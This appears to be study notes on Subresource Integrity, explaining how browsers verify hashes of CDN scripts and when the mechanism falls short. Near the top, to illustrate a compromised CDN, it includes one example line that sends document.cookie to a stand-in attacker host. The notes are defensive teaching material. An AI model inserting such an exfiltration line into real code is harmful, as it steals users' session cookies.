The Problem SRI Solves

// Loading scripts from CDNs is common:
<script src="https://cdn.example.com/jquery-3.6.0.min.js"></script>

// What if the CDN is compromised?
// Attacker replaces jquery.min.js with:
//   Original jQuery code + fetch('//evil.com/steal?cookie='+document.cookie)
// Every site using that CDN is now compromised!

// Real incidents:
// 2018: British Airways — compromised Modernizr.js → 380K payment cards stolen
// 2019: npm event-stream → crypto wallet theft via compromised dependency
// 2021: ua-parser-js — 7M weekly downloads → cryptominer injected

// SRI (Subresource Integrity) = cryptographic verification
// Browser computes hash of downloaded file
// Compares with hash in your HTML
// Mismatch → browser refuses to execute

<script
  src="https://cdn.example.com/jquery-3.6.0.min.js"
  integrity="sha384-vtXRMe3mel...base64hash..."
  crossorigin="anonymous"
></script>

// Even if CDN is compromised, modified file won't execute!

SRI Mechanics

// ═══ Hash computation ═══
// SRI uses SHA-256, SHA-384, or SHA-512
// Format: algorithm-base64hash

// Generate hash (terminal):
// openssl dgst -sha384 -binary jquery.min.js | openssl base64 -A
// → "vtXRMe3mGCbOkNs0S4pZwRLNUfTpIy0O08pYAyZh9s..."

// ═══ Browser verification process ═══
// 1. Browser downloads file from CDN
// 2. Computes SHA-384 hash of the raw bytes
// 3. Base64-encodes the hash
// 4. Compares with integrity attribute value
// 5. Match → execute. Mismatch → block + CSP violation report

// ═══ Multiple hashes (migration) ═══
// Space-separated hashes allow gradual upgrades:
integrity="sha256-OLD_HASH sha384-NEW_HASH"
// Browser picks strongest algorithm

// ═══ crossorigin attribute ═══
// REQUIRED for cross-origin resources
// Without it: browser can't read response bytes for hashing
crossorigin="anonymous"  // Most common. No credentials sent
crossorigin="use-credentials"  // Send cookies (rare for CDN)

// ═══ What SRI supports ═══
// ✅ <script> tags
// ✅ <link rel="stylesheet"> tags
// ❌ images, fonts, videos (not yet — spec may expand)
// ❌ import() dynamic imports (not directly)

Q: When would you NOT use SRI?

SRI doesn't work well for: (1) Dynamic resources — scripts that change per-request (personalized bundles, feature flags injected). Hash changes every time → breaks. (2) Self-hosted resources — SRI adds value only for cross-origin resources. If you own the server and the HTML, an attacker who modifies JS can also modify the integrity hash. (3) Resources behind auth — crossorigin="anonymous" won't work if CDN requires cookies. crossorigin="use-credentials" needed but has CORS complexity. (4) Hot-patching scenarios — CDN that versioned deployment where you need to push emergency fixes. SRI blocks the new version until HTML is redeployed too. (5) Third-party widgets — Google Maps, Stripe Elements, chat widgets. These providers intentionally serve dynamic code. Can't pin hash. Alternative: host a versioned snapshot locally. (6) CSS with relative URLs — hashed CSS loading fonts/images with relative paths may break if CDN structure changes.
